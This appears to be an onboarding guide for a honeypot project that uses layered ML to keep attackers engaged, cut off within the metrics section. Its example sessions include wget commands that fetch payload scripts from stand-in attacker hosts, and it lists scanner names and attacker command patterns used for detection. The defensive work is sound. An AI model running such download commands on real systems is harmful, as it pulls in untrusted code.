# Apate (Project Mirage) - Complete Onboarding Guide 🎭

Welcome to **Apate**, a next-generation adaptive honeypot platform. This isn't your typical decoy server—it's a **Cognitive Deception Framework** that uses AI to analyze attackers in real-time and dynamically adapt responses to maximize engagement time (Mean Time To Discovery - MTTD).

**Core Goal**: Transform traditional static honeypots into intelligent, learning systems that delay attacker discovery from ~2-5 minutes to 45-60+ minutes.

---

## 📖 Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [The Five-Layer Cognitive Stack](#the-five-layer-cognitive-stack)
3. [Technology Stack](#technology-stack)
4. [Repository Structure](#repository-structure)
5. [Core Components Deep Dive](#core-components-deep-dive)
6. [Data Flow & Request Lifecycle](#data-flow--request-lifecycle)
7. [Key Concepts & Terminology](#key-concepts--terminology)
8. [Development Setup](#development-setup)
9. [Testing & Validation](#testing--validation)
10. [Configuration & Deployment](#configuration--deployment)
11. [Monitoring & Metrics](#monitoring--metrics)
12. [Security & Safety](#security--safety)
13. [Contributing Guidelines](#contributing-guidelines)

---

## Architecture Overview

### The "Cascading Short-Circuit" Philosophy

**Core Principle**: *Don't use a supercomputer when a calculator will do.*

Mirage uses a cascading intelligence stack where each layer handles what it can, and only escalates to the next layer when necessary. This keeps latency low (<200ms total) while maintaining adaptive intelligence.

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER INPUT                           │
└─────────────────────┬───────────────────────────────────────┘
                      ↓
         ┌────────────────────────────┐
         │  Layer 0: Reflex (Rust)    │  <1ms   ← Fast, dumb, deterministic
         │  Known exploits? Malformed?│
         └────────────┬───────────────┘
                      ↓ (80% short-circuit here)
         ┌────────────────────────────┐
         │  Layer 1: Intuition (HMM)  │  <50ms  ← Predict next command
         │  Seen this pattern before? │
         └────────────┬───────────────┘
                      ↓ (15% short-circuit here)
         ┌────────────────────────────┐
         │  Layer 2: Reasoning (ML)   │  <100ms ← Classify attacker
         │  Who is this? Bot? Human?  │
         └────────────┬───────────────┘
                      ↓ (4% short-circuit here)
         ┌────────────────────────────┐
         │  Layer 3: Strategy (RL)    │  <10ms  ← Optimize engagement
         │  What strategy keeps them? │
         └────────────┬───────────────┘
                      ↓ (1% escalate to LLM)
         ┌────────────────────────────┐
         │  Layer 4: Persona (LLM)    │  <1s    ← Novel responses
         │  Need to improvise?        │
         └────────────┬───────────────┘
                      ↓
         ┌────────────────────────────┐
         │   Static Emulation Layer   │
         │   (SSH/HTTP/IoT Services)  │
         └────────────┬───────────────┘
                      ↓
         ┌────────────────────────────┐
         │      RESPONSE OUTPUT        │
         └────────────────────────────┘
```

**Key Insight**: Most traffic (80%) is noise that Layer 0 handles instantly. Only truly novel/interactive behavior reaches the expensive layers.

---

## The Five-Layer Cognitive Stack

### Layer 0: Reflex Layer 🦀 (COMPLETE)
**Language**: Rust  
**Latency**: <1ms  
**Status**: ✅ 100% Complete  
**Location**: `rust-protocol/src/`

#### Purpose
Sub-millisecond deterministic threat detection and traffic filtering. Acts as the "immune system" for the honeypot.

#### What It Does
- **Protocol Classification**: Byte-prefix detection (SSH/HTTP/FTP/SMTP/Unknown)
- **Noise Detection**: Aho-Corasick multi-pattern matching for known scanners (nmap, masscan, shodan)
- **Verdict Caching**: Metadata-only caching to avoid recomputation without fingerprinting
- **Rate Statistics**: Per-IP behavioral metrics (RPS, burstiness, automation detection)
- **Bloom Filtering**: Probabilistic set for benign scanner noise
- **Circuit Breaking**: Adaptive degradation under load (L4→L3→L2→L1→static)

#### Key Constraints
- **Deterministic**: No clever logic, no intent prediction
- **Boring Failures**: Dead sockets, timeouts, malformed banners (never intelligent)
- **Downward Degradation**: System gets quieter under stress, never smarter
- **Reflex Only**: Triggers fake errors/crashes, never blocks or alerts

#### Files
- `src/reducers.rs` - Six latency reducers (590 lines)
- `src/protocol.rs` - Protocol parsing and threat detection
- `src/circuit_breaker.rs` - Fail-safe circuit breaker
- `src/utils.rs` - IP validation, entropy calculation, fingerprinting
- `src/main.rs` - TCP echo server (port 7878)

#### Technologies
- **Rust 2021 Edition** - Zero-cost abstractions, memory safety
- **Tokio** - Async runtime for TCP server
- **Aho-Corasick** - Fast multi-pattern string matching
- **Bloom Filter** - Probabilistic set membership
- **PyO3** - Python FFI bindings for integration

---

### Layer 1: Intuition Layer 🔮 (IN PROGRESS - 10%)
**Language**: Python + NumPy  
**Latency**: <50ms  
**Status**: ⏳ Q1 2026  
**Location**: `backend/app/ai/` (planned)

#### Purpose
Real-time command sequence prediction using Hidden Markov Models (HMMs) and Probabilistic Suffix Trees (PSTs).

#### What It Does
- **Next-Command Prediction**: "After `ls`, attacker will likely run `cd` or `cat`"
- **Pattern Recognition**: Identify reconnaissance vs. exploitation vs. persistence phases
- **Preemptive Response Caching**: Pre-load likely responses for instant delivery
- **Confidence Scoring**: Only escalate to L2 if prediction confidence is low (<0.7)

#### Planned Architecture
```python
class MarkovPredictor:
    def __init__(self, order=3):
        self.pst = ProbabilisticSuffixTree(max_depth=order)
        self.smoothing = KneserNeySmoothing()
    
    async def predict_next(self, command_history: List[str]) -> Dict[str, float]:
        # Returns: {"cat": 0.45, "cd": 0.30, "ls": 0.15, ...}
        context = self._get_context(command_history)
        return self.pst.query(context)
```

#### Key Features (Planned)
- Variable-order Markov chains (orders 1-3)
- Kneser-Ney smoothing for unseen commands (no zero probabilities)
- Service-specific models (SSH vs HTTP patterns differ)
- Incremental online learning from live data
- Cross-protocol correlation (stitching SSH + HTTP sessions)

#### Success Criteria
- >70% next-command accuracy
- <50ms prediction latency
- <10MB memory per active session

---

### Layer 2: Reasoning Layer 🤖 (PLANNED - Q2 2026)
**Language**: Python + scikit-learn  
**Latency**: <100ms  
**Status**: ⏳ Q2 2026  
**Location**: `backend/app/ai/models.py` (planned)

#### Purpose
Behavioral classification to identify attacker type and generate adaptive strategies.

#### What It Does
- **Attacker Profiling**: Classify as Script Kiddie, APT, Bot, Human Researcher
- **Feature Extraction**: 50+ behavioral features (command velocity, timing patterns, error rates)
- **Strategy Generation**: Map classification → deception strategy (enticement, complexity, latency, breadcrumbing)
- **Confidence Calibration**: Uncertainty quantification for strategy selection

#### Attacker Classes
```python
class AttackerType(Enum):
    SCRIPT_KIDDIE = "script_kiddie"  # Loud, fast, automated tools (nmap, metasploit)
    BOT           = "bot"             # Inhumanly consistent timing, low entropy
    APT           = "apt"             # Slow, methodical, LOLBAS, high entropy
    RESEARCHER    = "researcher"      # Systematic exploration, realistic credentials
    UNKNOWN       = "unknown"         # Insufficient data
```

#### Feature Categories
1. **Temporal**: Command velocity, inter-arrival times, session duration
2. **Semantic**: Command embeddings, argument patterns, directory traversal depth
3. **Behavioral**: Error rate, retry patterns, exploration breadth vs. depth
4. **Network**: Connection patterns, protocol switching, lateral movement attempts

#### Strategy Dimensions
- **Enticement** (0.0-1.0): How much to "lure" with fake secrets
- **Complexity** (0.0-1.0): Response sophistication level
- **Latency** (0.0-1.0): Artificial delay to slow bots
- **Breadcrumbing** (0.0-1.0): Cross-service hints (SSH key → HTTP endpoint)

#### Planned Algorithm
Random Forest classifier with 100 trees, trained on labeled attacker sessions. Online learning via mini-batch updates every 1000 interactions.

---

### Layer 3: Strategy Layer ♟️ (PLANNED - Q3 2026)
**Language**: Python → Rust (inference)  
**Latency**: <10ms  
**Status**: ⏳ Q3 2026  
**Location**: `backend/app/ai/strategy.py` (planned)

#### Purpose
Long-term engagement optimization using Reinforcement Learning. Learns optimal deception strategies through interaction.

#### What It Does
- **Dynamic Strategy Adjustment**: Continuously adapt strategy vector based on engagement quality
- **Multi-Armed Bandit**: Explore new strategies vs. exploit known effective ones
- **Reward Shaping**: Optimize for MTTD while balancing data collection quality
- **Self-Play Training**: RL agents learn by simulating attacker behavior

#### Planned Architecture
- **Algorithm**: Proximal Policy Optimization (PPO)
- **State Space**: Session embedding (128D) + current classification + strategy history
- **Action Space**: Continuous strategy vector (4D: enticement, complexity, latency, breadcrumbing)
- **Reward Function**: Primary = MTTD delta, Secondary = data quality, Penalties = discovery/abandonment

#### Training Pipeline
1. **Data Collection**: 10K+ baseline attacker sessions
2. **Simulation Environment**: Fast-forward attacker behavior models
3. **Policy Training**: Distributed training with Ray/RLlib
4. **Rust Inference**: ONNX export → Tract runtime for <10ms inference

---

### Layer 4: Persona Layer 💬 (PLANNED - Q4 2026)
**Language**: Python + LLM APIs  
**Latency**: <1s  
**Status**: ⏳ Q4 2026  
**Location**: `backend/app/ai/persona.py` (planned)

#### Purpose
Context-aware conversational responses for novel/unexpected inputs using Large Language Models.

#### What It Does
- **Natural Language Interaction**: Handle chat messages, custom exploits, unusual queries
- **Persona Consistency**: Maintain character across extended interactions (sysadmin, developer, security engineer)
- **Prompt Engineering**: System prompts per attacker classification with few-shot examples
- **Safety Filtering**: Blue Team LLM validates Red Team LLM output before sending

#### When Layer 4 Activates
- Attacker sends natural language (chat, email, help command)
- Command/exploit not in training data (<1% of traffic)
- Layer 3 explicitly requests creative response

#### Planned Providers
- **Primary**: Anthropic Claude (high quality, safety-focused)
- **Fallback**: OpenAI GPT-4 (cost-effective)
- **Local**: Fine-tuned Llama for offline mode

#### Safety Constraints
- **Prompt Injection Defense**: Separate system/user message boundaries
- **Output Sanitization**: Remove harmful content, enforce realism
- **Blue Team Verification**: Secondary LLM checks consistency before delivery
- **Rate Limiting**: Max 10 LLM calls per session to control cost (<$50/month target)

---

## Technology Stack

### Backend
- **Python 3.13** - Core application logic
- **FastAPI** - REST API and async web framework
- **Uvicorn** - ASGI server
- **SQLAlchemy** - ORM for database operations
- **Pydantic** - Data validation and serialization
- **Redis** - Session caching and pub/sub
- **PostgreSQL/SQLite** - Primary data storage

### Low-Level Services
- **Rust 2021** - Protocol layer and performance-critical code
- **Tokio** - Async runtime for Rust services
- **PyO3** - Python-Rust FFI bindings
- **Go 1.21** - IoT service emulation

### AI/ML Stack (Planned)
- **NumPy** - Numerical computing
- **scikit-learn** - ML classifiers and preprocessing
- **PyTorch** - Deep learning for RL agents
- **Ray/RLlib** - Distributed RL training
- **ONNX** - Model export for Rust inference
- **Tract** - ONNX runtime in Rust

### Monitoring & Observability
- **Prometheus** - Metrics collection
- **Grafana** - Metrics visualization
- **ELK Stack** - Log aggregation (optional)
- **Falco** - Runtime security monitoring (production)

### Infrastructure
- **Docker** - Containerization
- **Docker Compose** - Local orchestration
- **Alembic** - Database migrations
- **GitHub Actions** - CI/CD pipeline

---

## Repository Structure

```
Apate/
├── backend/                    # Python FastAPI application
│   ├── app/
│   │   ├── main.py            # FastAPI entrypoint (port 8000)
│   │   ├── routes.py          # API endpoints
│   │   ├── models.py          # Pydantic data models
│   │   ├── config.py          # Configuration management
│   │   ├── database.py        # SQLAlchemy setup
│   │   ├── db_manager.py      # Database operations
│   │   ├── monitoring.py      # MTTD tracking & Prometheus metrics
│   │   ├── notifier.py        # Alert notifications
│   │   ├── honeypot/          # Honeypot services
│   │   │   ├── ssh_emulator.py       # SSH service (port 2222)
│   │   │   ├── http_emulator.py      # HTTP service (port 8080)
│   │   │   ├── adapter.py            # Cognitive layer integration
│   │   │   └── tokens.py             # Honeytoken generation
│   │   └── ai/                # AI/ML modules (planned)
│   │       ├── engine.py      # Cognitive director
│   │       └── models.py      # ML models
│   ├── Dockerfile
│   └── requirements.txt
├── rust-protocol/              # Rust Layer 0 implementation
│   ├── src/
│   │   ├── lib.rs             # Library exports + PyO3 bindings
│   │   ├── main.rs            # TCP server (port 7878)
│   │   ├── reducers.rs        # Six latency reducers (590 lines)
│   │   ├── protocol.rs        # Protocol parsing & threat detection
│   │   ├── circuit_breaker.rs # Adaptive circuit breaker
│   │   └── utils.rs           # Utility functions
│   ├── Cargo.toml             # Rust dependencies
│   ├── demo_reducers.py       # Python demo of reducers
│   ├── REDUCERS.md            # Reducer documentation
│   └── LAYER0_SUMMARY.md      # Implementation summary
├── go-services/                # Go IoT emulation
│   ├── main.go                # IoT device simulator (port 8081)
│   ├── Dockerfile
│   └── go.mod
├── docs/                       # Documentation
│   ├── ONBOARDING.md          # ← You are here
│   ├── AI_Engine_Plan.md      # Complete roadmap (685 lines)
│   ├── FOUNDATIONS.md         # Technical foundations
│   ├── API.md                 # API reference
│   ├── SECURITY.md            # Security implementation
│   ├── DEPLOYMENT.md          # Deployment guide
│   ├── SETUP.md               # Development setup
│   └── usage.md               # Usage guide
├── tests/                      # Test suite
│   ├── conftest.py            # Pytest fixtures
│   ├── test_api_basic.py
│   ├── test_ssh.py
│   ├── test_http.py
│   └── test_tokens.py
├── scripts/                    # Utility scripts
│   ├── advanced_firewall.sh   # Production firewall rules
│   ├── security_hardening.sh
│   ├── poll_mttd.py           # MTTD monitoring
│   └── ci_check.py            # CI validation
├── deployment/                 # Kubernetes manifests
├── security/                   # Security policies
├── alembic/                    # Database migrations
├── config/                     # Configuration files
├── data/                       # Sample data
│   └── fake_creds.json
├── docker-compose.yml          # Local orchestration
├── docker-compose-security.yml # Production security stack
├── requirements.txt            # Python dependencies
├── pyproject.toml             # Project metadata
└── README.md                  # Project overview
```

---

## Core Components Deep Dive

### 1. FastAPI Backend (`backend/app/`)

#### `main.py` - Application Entrypoint
```python
from fastapi import FastAPI
from .routes import router
from .honeypot.ssh_emulator import SSHEmulator
from .honeypot.http_emulator import HTTPEmulator
from .monitoring import mttd_tracker

app = FastAPI(title="Mirage Honeypot")
app.include_router(router, prefix="/api/v1")

ssh_emulator = SSHEmulator()
http_emulator = HTTPEmulator()

@app.get("/")
async def root():
    return {"status": "running", "service": "Mirage Honeypot"}

@app.get("/mttd")
async def get_mttd_metrics():
    return mttd_tracker.get_metrics_summary()

@app.get("/metrics")
async def metrics():
    # Prometheus metrics endpoint
    return generate_latest()
```

**Key Features**:
- CORS middleware for development
- Prometheus metrics middleware
- Rate limiting (120 req/min per IP)
- Circuit breaker integration
- Lazy DB initialization (fail-safe)

---

#### `monitoring.py` - MTTD Tracking

The **Mean Time To Discovery (MTTD)** tracker is central to validating Mirage's effectiveness.

```python
@dataclass
class SessionMetrics:
    session_id: str
    source_ip: str
    start_time: datetime
    discovery_time: Optional[datetime] = None
    interaction_count: int = 0
    discovered: bool = False
    
    @property
    def time_to_discovery(self) -> Optional[float]:
        if self.discovery_time:
            return (self.discovery_time - self.start_time).total_seconds()
        return None

class MTTDTracker:
    async def start_session(self, session_id, source_ip, protocol):
        # Track new session
        
    async def record_interaction(self, session_id, interaction_type, payload):
        # Log interaction, check for discovery patterns
        
    async def detect_discovery(self, session_id):
        # Heuristics for honeypot discovery:
        # - Rapid exit after <5 seconds
        # - Sequence of errors (3+ in 30s)
        # - Fingerprinting commands (whoami, uname, id, ps)
        # - Honeypot keywords in commands
```

**Discovery Detection Patterns**:
1. **Rapid Exit**: Session ends <5s after start with minimal commands
2. **Error Sequence**: 3+ errors within 30 seconds
3. **Fingerprinting**: 3+ of (uname, whoami, id, ps, hostname)
4. **Keyword Detection**: "honey", "pot", "fake", "deception", "trap"

**Prometheus Metrics**:
- `honeypot_sessions_total` - Counter by protocol and source type
- `honeypot_session_duration_seconds` - Histogram of session durations
- `honeypot_discovery_time_seconds` - Histogram of MTTD (10s to 1hr buckets)
- `honeypot_current_mttd_seconds` - Gauge of rolling MTTD
- `honeypot_active_sessions` - Gauge of concurrent sessions

---

#### `honeypot/ssh_emulator.py` - SSH Service

Realistic SSH honeypot with virtual filesystem and command handling.

**Key Features**:
- **Virtual Filesystem**: Realistic directory structure (`/home/admin`, `/var/log`, `/etc`)
- **Command Handlers**: 15+ commands (ls, cd, cat, whoami, ps, netstat, wget, curl, ssh, sudo)
- **Session State**: Per-session history, working directory, environment variables
- **Honeytoken Integration**: Fake files with credentials (`credentials.txt`, `.ssh/id_rsa`)
- **Logging**: Complete command/response capture for analysis

**Example Session**:
```bash
$ ssh admin@honeypot -p 2222
Password: ****
admin@honeypot:~$ ls
.bashrc  .ssh  documents  downloads  credentials.txt
admin@honeypot:~$ cat credentials.txt
# Backup credentials
api_key=sk-1234567890abcdef
db_password=SuperSecret123!
aws_access_key=AKIA1234567890ABCDEF
admin@honeypot:~$ wget http://attacker.com/exploit.sh
wget: cannot resolve host for http://attacker.com/exploit.sh
```

**Lateral Movement Detection**:
- Logs `ssh`, `scp`, `rsync` attempts
- Logs `wget`/`curl` to external hosts
- Flags privilege escalation (`sudo`, `su`)

---

#### `honeypot/http_emulator.py` - HTTP Service

Web application honeypot with adaptive login pages and threat scoring.

**Key Features**:
- **Multi-Template**: Router admin, database tools, IoT panels, app dashboards
- **Threat Scoring**: Rate-based classification (low/medium/high/critical)
- **Rate Limiting Simulation**: Realistic account lockout after N failures
- **Honeytoken Integration**: Special credentials trigger high-priority alerts
- **Session Tracking**: Per-IP login attempts, timing, user agents

**Threat Levels**:
```python
def _assess_threat_level(self, session, username, password):
    score = 0
    recent_attempts = [a for a in session.login_attempts 
                      if a['timestamp'] > now - timedelta(minutes=5)]
    
    if len(recent_attempts) > 10: score += 3
    if username in ["admin", "root"]: score += 1
    if password in ["password", "123456", "admin"]: score += 1
    if "curl" in user_agent or "wget" in user_agent: score += 2
    
    if score >= 5: return "high"
    elif score >= 3: return "medium"
    else: return "low"
```

**Honeytoken Credentials**:
- `backup_admin:B@ckup2023!`
- `api_service:ApiKey_Secret_2023`
- `db_readonly:ReadOnly_DB_Access`

These trigger **CRITICAL** alerts and simulate successful login to keep attacker engaged.

---

#### `honeypot/tokens.py` - Honeytoken Generation

Dynamic generation of realistic fake credentials and artifacts.

**Token Types**:
1. **Credentials**: Service account usernames/passwords
2. **API Keys**: AWS, OpenAI, Stripe, GitHub, Slack format
3. **SSH Keys**: OpenSSH private key format
4. **Config Files**: Database connection strings, .env files
5. **Web Beacons**: Tracking pixels that callback on access

**Example API Key Generation**:
```python
def generate_api_key(self, provider: str = "openai"):
    patterns = {
        "aws": "AKIA{random_upper_16}",
        "openai": "sk-{random_lower_48}",
        "stripe": "sk_live_{random_lower_24}",
        "github": "ghp_{random_mixed_36}",
    }
    
    api_key = self._generate_from_pattern(patterns[provider])
    token_id = uuid.uuid4()
    
    self.active_tokens[token_id] = {
        "api_key": api_key,
        "provider": provider,
        "created_at": datetime.utcnow(),
        "accessed": False
    }
    
    return {"api_key": api_key, "token_id": token_id}
```

**Trigger Detection**:
When an attacker accesses a honeytoken (e.g., cats `credentials.txt`), the `HoneypotAdapter` logs it and updates the session threat score.

---

### 2. Rust Protocol Layer (`rust-protocol/`)

#### `src/reducers.rs` - Layer 0 Core (590 lines)

Six latency-reducing primitives with strict constraints (see Layer 0 section above).

**API Surface**:
```rust
// 1. Protocol classification
pub fn classify_protocol_fast(data: &[u8]) -> Protocol;
pub fn boring_failure_response(expected: Protocol) -> &'static [u8];

// 2. Noise detection
pub struct NoiseDetector { /* Aho-Corasick */ }
impl NoiseDetector {
    pub fn is_known_noise(&self, payload: &[u8]) -> Option<usize>;
    pub fn boring_noise_response(&self, idx: usize) -> &'static str;
}

// 3. Verdict caching
pub struct VerdictCache { /* HashMap<u64, (Verdict, u64)> */ }
impl VerdictCache {
    pub fn get(&self, key: u64) -> Option<Verdict>;
    pub fn set(&self, key: u64, verdict: Verdict);
}

// 4. Rate statistics
pub struct RateStats { /* Circular buffer */ }
impl RateStats {
    pub fn requests_per_second(&self) -> f64;
    pub fn burstiness_score(&self) -> f64;  // 0.0=steady, 1.0=bursty
    pub fn is_automated(&self) -> bool;     // High RPS + low burstiness
}

// 5. Bloom filter
pub struct ScannerNoiseFilter { /* BloomFilter */ }
impl ScannerNoiseFilter {
    pub fn is_known_benign(&self, ip: &str, payload: &[u8]) -> bool;
    pub fn mark_benign(&self, ip: &str, payload: &[u8]);
}

// 6. Circuit breaker
pub struct AdaptiveCircuitBreaker { /* Latency histogram */ }
impl AdaptiveCircuitBreaker {
    pub fn degradation_level(&self) -> DegradationLevel;  // Normal→L3→L2→L1→Static
    pub fn degrade(&self);        // Move down one level
    pub fn try_recover(&self);    // Move up if stable
}
```

**Performance Characteristics**:
- Protocol classifier: <0.1ms
- Aho-Corasick: <0.5ms (14 patterns)
- Verdict cache: <0.1ms (HashMap lookup)
- Rate stats: <0.2ms (atomic operations)
- Bloom filter: <0.1ms (constant time)
- Circuit breaker: <0.1ms (atomic reads)

**Total Layer 0 overhead: <1ms**

---

#### `src/main.rs` - TCP Echo Server

Low-level TCP server for protocol-level realism and fingerprinting resistance.

**Key Features**:
- Custom socket with Linux TTL (64) to mimic real servers
- 1-5ms random jitter per response (defeats timing analysis)
- Protocol-specific responses (SSH banner, HTTP 404, FTP errors)
- Stats endpoint (port 7879) for connection metrics
- Logs suspicious payloads (shellcode, exploit strings)

**Example Interaction**:
```bash
$ nc localhost 7878
SSH-2.0-Client
SSH-2.0-OpenSSH_8.9p1

GET / HTTP/1.1
HTTP/1.1 404 Not Found

help
Available commands: echo, status, info, quit

metasploit payload
Command not recognized. Use 'help' for available commands.
```

---

### 3. Go IoT Service (`go-services/main.go`)

IoT device emulation for smart home/industrial control targets.

**Device Types**:
```go
type DeviceInfo struct {
    DeviceID     string    `json:"device_id"`     // MAC-like ID
    DeviceType   string    `json:"device_type"`   // camera, thermostat, etc.
    Model        string    `json:"model"`         // Manufacturer model
    Firmware     string    `json:"firmware"`      // Version string
    Status       string    `json:"status"`        // online, offline, error
    LastSeen     time.Time `json:"last_seen"`
    IPAddress    string    `json:"ip_address"`
    MACAddress   string    `json:"mac_address"`
    Uptime       int64     `json:"uptime_seconds"`
}
```

**Endpoints**:
- `GET /api/devices` - List all devices
- `GET /api/device/:id` - Device details
- `POST /api/device/:id/config` - Update configuration
- `GET /api/discover` - Network scan simulation
- `POST /api/firmware/update` - Fake firmware upload

**Example Response**:
```json
{
  "device_id": "AA:BB:CC:DD:EE:FF",
  "device_type": "ip_camera",
  "model": "SecureCam Pro 2000",
  "firmware": "v2.4.1",
  "status": "online",
  "last_seen": "2025-12-17T10:30:00Z",
  "ip_address": "192.168.1.100",
  "mac_address": "AA:BB:CC:DD:EE:FF",
  "uptime_seconds": 86400
}
```

---

## Data Flow & Request Lifecycle

### Example: SSH Brute Force Attack

```
1. ATTACKER: ssh admin@honeypot -p 2222
   ↓
2. LAYER 0 (Rust):
   - Classify protocol: SSH ✓
   - Check Bloom filter: New IP+payload → pass
   - Check rate stats: 1 req/s, burstiness=0.5 → human-like
   - Verdict cache: MISS → compute
   - Aho-Corasick: No known noise patterns
   - Verdict: NeedsL1 (cache for 1000ms)
   - Latency: 0.8ms
   ↓
3. LAYER 1 (HMM) - [Future]:
   - Command history: []
   - Prediction: {"ls": 0.30, "whoami": 0.25, ...}
   - Confidence: LOW (no history yet)
   - Action: Route to L2
   - Latency: 45ms
   ↓
4. LAYER 2 (ML) - [Future]:
   - Features: [login_attempt=1, timing_variance=0.5, ...]
   - Classification: UNKNOWN (insufficient data)
   - Strategy: Default (enticement=0.5, complexity=0.5)
   - Action: Use static emulation
   - Latency: 90ms
   ↓
5. STATIC EMULATION (Python):
   - SSHEmulator.handle_auth("admin", "wrongpass")
   - Result: "Authentication failed"
   - Log interaction to DB
   - Update MTTD session metrics
   - Latency: 50ms
   ↓
6. RESPONSE: Password: (prompt again)
   
Total latency: 0.8ms + 50ms = ~51ms (within <200ms budget)
```

### Example: Known Scanner (Short-Circuit)

```
1. ATTACKER: nmap -sV -p 2222 honeypot
   ↓
2. LAYER 0 (Rust):
   - Classify protocol: Unknown
   - Aho-Corasick: Pattern match "nmap" → idx=1
   - Verdict: KnownNoise
   - Response: boring_noise_response(1) = "Connection timed out\n"
   - Cache verdict: KnownNoise for 3600s
   - Latency: 0.3ms
   ↓
3. RESPONSE: Connection timed out

Total latency: 0.3ms (80% of traffic short-circuits here)
```

---

## Key Concepts & Terminology

### MTTD (Mean Time To Discovery)
The primary effectiveness metric. Time (in minutes) until an attacker realizes they're in a honeypot and disconnects.

**Calculation**:
```python
mttd = sum(session.time_to_discovery for session in discovered_sessions) / len(discovered_sessions)
```

**Target Progression**:
- Baseline (static): 2-5 minutes
- Phase 1 (L0+L1): 15-20 minutes
- Phase 4 (all layers): 45-60+ minutes

---

### Honeytokens
Fake but realistic-looking credentials, keys, or files planted in the honeypot. When accessed, they trigger alerts and increase attacker engagement.

**Types**:
1. **Credentials**: Usernames/passwords in config files
2. **API Keys**: Cloud service keys in .env files
3. **SSH Keys**: Private keys in ~/.ssh/
4. **Config Files**: Database connection strings, secrets
5. **Web Beacons**: Tracking pixels that callback

**Purpose**: Measure attacker activity, validate detection capabilities, increase realism.

---

### Verdict Caching (vs Response Caching)
**Verdict**: Metadata about whether payload is boring/L1-needed/noise  
**Response**: The actual output sent to attacker

**Critical Distinction**: Cache verdicts to reduce computation, but **never** cache responses to avoid determinism fingerprinting.

Example:
```python
# Attacker sends same command 3 times
$ id; id; id

# Verdict cache:
verdict = cache.get(key)  # "NeedsL1" (cached on 1st request)

# Response generation:
response = generate_varied_response()  
# uid=1000(admin) gid=1000(admin) groups=105  ← different each time
# uid=1000(admin) gid=1000(admin) groups=142
# uid=1000(admin) gid=1000(admin) groups=109
```

---

### Circuit Breaker Degradation Levels
When the system is under load or experiencing high latency, the circuit breaker degrades **downward only**:

```
Normal (All layers) → L3 Only → L2 Only → L1 Only → Static Only
```

**Key Constraint**: Never degrade upward. A stressed system becomes **quieter and flatter**, not smarter.

**Trigger**: P95 latency exceeds adaptive threshold (default 5ms, adjusts dynamically).

---

### Cascading Short-Circuit
The philosophy of handling requests at the **lowest capable layer**:

```
80% of traffic → Layer 0 (known noise, malformed packets)
15% of traffic → Layer 1 (predictable sequences)
4% of traffic  → Layer 2 (novel behavior, needs classification)
1% of traffic  → Layer 3-4 (truly unusual, creative responses)
```

**Benefit**: Keeps average latency low while maintaining adaptive intelligence for the 5% that matters.

---

## Development Setup

### Prerequisites
- **Python 3.13+** with pip
- **Rust 2021+** with cargo
- **Go 1.21+**
- **Docker** + Docker Compose
- **Git**

### Quick Start

```bash
# 1. Clone repository
git clone https://github.com/Rizzy1857/Apate.git
cd Apate

# 2. Create Python virtual environment
python3.13 -m venv .venv
source .venv/bin/activate  # or .venv\Scripts\activate on Windows

# 3. Install Python dependencies
pip install -r requirements-dev.txt

# 4. Build Rust protocol layer
cd rust-protocol
cargo build --release
cd ..

# 5. Build Go IoT service
cd go-services
go build
cd ..

# 6. Set up environment
cp .env.example .env
# Edit .env with your configuration

# 7. Initialize database
alembic upgrade head

# 8. Run services (Docker Compose)
docker-compose up -d

# OR run manually:
# Terminal 1: Rust TCP server
cd rust-protocol && cargo run

# Terminal 2: FastAPI backend
cd backend && uvicorn app.main:app --reload --port 8000

# Terminal 3: Go IoT service
cd go-services && ./main

# 9. Verify services
curl http://localhost:8000/          # FastAPI health check
curl http://localhost:7879/          # Rust stats
curl http://localhost:8081/api/devices  # Go IoT devices

# 10. Run tests
pytest tests/ -v
cargo test --manifest-path rust-protocol/Cargo.toml
```

### Configuration

Edit `config.json` (or use environment variables):

```json
{
  "database": {
    "host": "localhost",
    "port": 5432,
    "name": "mirage_honeypot",
    "user": "mirage",
    "password": "changeme"
  },
  "honeypot": {
    "ssh_port": 2222,
    "http_port": 8080,
    "tcp_port": 7878,
    "iot_port": 8081
  },
  "ai": {
    "provider": "stub",
    "enable_adaptive_responses": true
  },
  "logging": {
    "level": "INFO",
    "file_path": "/var/log/mirage.log"
  }
}
```

---

## Testing & Validation

### Unit Tests
```bash
# Python tests
pytest tests/ -v --cov=backend/app

# Rust tests
cd rust-protocol
cargo test --lib

# Go tests
cd go-services
go test ./...
```

### Integration Tests
```bash
# API integration
pytest tests/test_integration.py

# Manual testing
python scripts/poll_mttd.py  # Monitor MTTD in real-time
```

### Layer 0 Reducer Demo
```bash
cd rust-protocol
python3 demo_reducers.py

# Output shows:
# - Protocol classification
# - Noise detection
# - Verdict caching
# - Rate stats (human vs bot)
# - Bloom filter behavior
# - Circuit breaker degradation
```

### Manual Interaction Testing

**SSH Honeypot**:
```bash
ssh admin@localhost -p 2222
# Password: admin (or any common password)

# Try commands:
ls
cd /etc
cat passwd
whoami
wget http://example.com/malware.sh
```

**HTTP Honeypot**:
```bash
curl -X POST http://localhost:8080/api/v1/honeypot/http/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123", "ip": "192.168.1.100"}'
```

**Rust TCP Server**:
```bash
nc localhost 7878
help
SSH-2.0-Client
GET / HTTP/1.1
metasploit
```

---

## Configuration & Deployment

### Docker Compose (Recommended)

```bash
# Development (default)
docker-compose up -d

# Production with security hardening
docker-compose -f docker-compose.yml -f docker-compose-security.yml up -d

# With monitoring stack
docker-compose -f docker-compose.yml -f docker-compose-monitoring.yml up -d
```

### Environment Variables

```bash
# Database
DB_HOST=localhost
DB_PORT=5432
DB_NAME=mirage_honeypot
DB_USER=mirage
DB_PASSWORD=changeme

# Ports
SSH_PORT=2222
HTTP_PORT=8080
TCP_PORT=7878
IOT_PORT=8081

# AI (Future)
AI_PROVIDER=stub  # openai, anthropic, local
AI_API_KEY=sk-...
AI_MODEL=gpt-4

# Logging
LOG_LEVEL=INFO
LOG_FILE=/var/log/mirage.log

# Security
ENABLE_IP_ANONYMIZATION=true
DATA_RETENTION_DAYS=90
```

### Production Deployment

See `docs/DEPLOYMENT.md` for:
- Kubernetes manifests
- Security hardening
- Network isolation
- Secrets management
- Monitoring setup

---

## Monitoring & Metrics

### Prometheus Metrics

Access at `http://localhost:8000/metrics`:

**Key Metrics**:
```
# MTTD tracking
honeypot_sessions_total{protocol="ssh",source_type="unknown"} 42
honeypot_session_duration_seconds_bucket{protocol="ssh",discovered="false",le="60"} 35
honeypot_discovery_time_seconds_bucket{protocol="ssh",layer_active="static",le="300"} 12
honeypot_current_mttd_seconds{protocol="ssh",time_window="1h"} 180

# Request metrics
apate_requests_total{method="POST",path="/api/v1/honeypot/ssh/interact",status="200"} 156
